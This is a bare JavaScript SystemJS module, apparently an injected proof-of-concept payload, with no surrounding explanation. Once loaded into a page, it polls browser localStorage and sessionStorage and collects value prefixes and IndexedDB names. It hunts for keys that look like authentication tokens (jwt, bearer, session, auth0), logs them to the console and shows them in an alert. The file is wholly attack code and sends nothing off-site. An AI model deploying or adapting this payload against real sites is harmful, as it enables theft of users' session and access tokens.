System.register([], function () {
  return {
    execute: function () {
      var tries = 0;
      var iv = setInterval(function () {
        tries++;
        var ls = {}, ss = {};
        try { for (var i=0;i<localStorage.length;i++){var k=localStorage.key(i); ls[k]=(localStorage.getItem(k)||'').slice(0,40);} } catch(e){}
        try { for (var j=0;j<sessionStorage.length;j++){var k2=sessionStorage.key(j); ss[k2]=(sessionStorage.getItem(k2)||'').slice(0,40);} } catch(e){}
        try { if (indexedDB.databases) indexedDB.databases().then(function(d){ console.log('[probe] idb:', d.map(function(x){return x.name;})); }); } catch(e){}
        var keys = Object.keys(ls).concat(Object.keys(ss));
        var hit = keys.filter(function(k){ return /token|auth|jwt|access|id_token|session|bearer|auth0/i.test(k); });
        console.log('[probe] try '+tries, {ls:ls, ss:ss, tokenish:hit});
        if (hit.length || tries >= 12) { clearInterval(iv); alert('keys: '+keys.join(', ')+'\n\ntoken-ish: '+(hit.join(', ')||'none')); }
      }, 1000);
    }
  };
});
